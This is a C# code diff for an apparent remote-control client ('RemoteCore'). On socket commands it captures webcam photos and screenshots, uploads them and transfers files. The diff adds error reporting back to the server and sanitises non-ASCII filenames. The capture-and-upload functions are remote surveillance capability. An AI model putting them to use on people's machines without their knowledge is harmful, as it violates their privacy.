@@ -454,17 +454,19 @@ namespace RemoteCore
                     if (!InitializeCamera())
                     {
                         Console.WriteLine("Failed to initialize camera");
+                        await _socket.EmitAsync("action_error", new { action = "shoot", error = "Failed to initialize camera" });
                         return;
                     }
                 }
 
                 byte[] imageBytes = await Task.Run(() => CaptureJpegFromDefaultCamera());
-                await UploadPhotoAsync(imageBytes);
+                await UploadPhotoAsync(imageBytes, "shoot");
                 Console.WriteLine("Photo taken and uploaded successfully");
             }
             catch (Exception ex)
             {
                 Console.WriteLine($"Camera error: {ex.Message}");
+                await _socket.EmitAsync("action_error", new { action = "shoot", error = ex.Message });
                 // 异常发生后重新初始化摄像头
                 _cameraInitialized = false;
             }
@@ -488,15 +490,16 @@ namespace RemoteCore
                 }
                 using MemoryStream ms = new MemoryStream();
                 bitmap.Save(ms, ImageFormat.Jpeg);
-                await UploadPhotoAsync(ms.ToArray());
+                await UploadPhotoAsync(ms.ToArray(), "screenshot");
             }
             catch (Exception ex)
             {
                 Console.WriteLine($"Screenshot error: {ex.Message}");
+                await _socket.EmitAsync("action_error", new { action = "screenshot", error = ex.Message });
             }
         }
 
-        private async Task UploadPhotoAsync(byte[] imageBytes)
+        private async Task UploadPhotoAsync(byte[] imageBytes, string action)
         {
             try
             {
@@ -511,6 +514,7 @@ namespace RemoteCore
             catch (Exception ex)
             {
                 Console.WriteLine($"Upload error: {ex.Message}");
+                await _socket.EmitAsync("action_error", new { action = action, error = "Upload failed: " + ex.Message });
             }
         }
 
@@ -688,7 +692,12 @@ namespace RemoteCore
                         }
                     }
                 );
-                content.Add(streamContent, "file", filename);
+                string partFilename = filename;
+                if (!string.IsNullOrEmpty(filename) && filename.Any(ch => ch > 127))
+                {
+                    partFilename = "file" + Path.GetExtension(filename);
+                }
+                content.Add(streamContent, "file", partFilename);
                 content.Add(new StringContent(filename), "filename");
                 content.Add(new StringContent(transferId), "transfer_id");
 
